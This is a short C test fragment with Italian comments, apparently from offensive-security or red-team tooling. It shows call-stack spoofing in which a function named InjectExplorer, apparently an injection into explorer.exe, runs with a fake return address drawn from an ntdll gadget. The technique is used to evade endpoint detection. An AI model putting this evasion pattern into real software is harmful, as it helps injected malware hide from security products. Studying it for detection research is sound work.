// Scenario 2: Single-Frame Spoofing
// Un gadget ntdll e' passato a SpoofCallStack come LR falso.
void TestInjectionSingleFrame(void)
{
    void *spoofedReturnGadget = GetRandomGadget(&g_gadgetCache); // ntdll post-BL site
    void *realReturn = NULL;

    DWORD64 result = SpoofCallStack(
        InjectExplorer,       // target
        spoofedReturnGadget,  // indirizzo di ritorno falso (gadget ntdll)
        NULL,                 // parametro passato a InjectExplorer
        &realReturn);         // riceve il LR reale per verifica
}
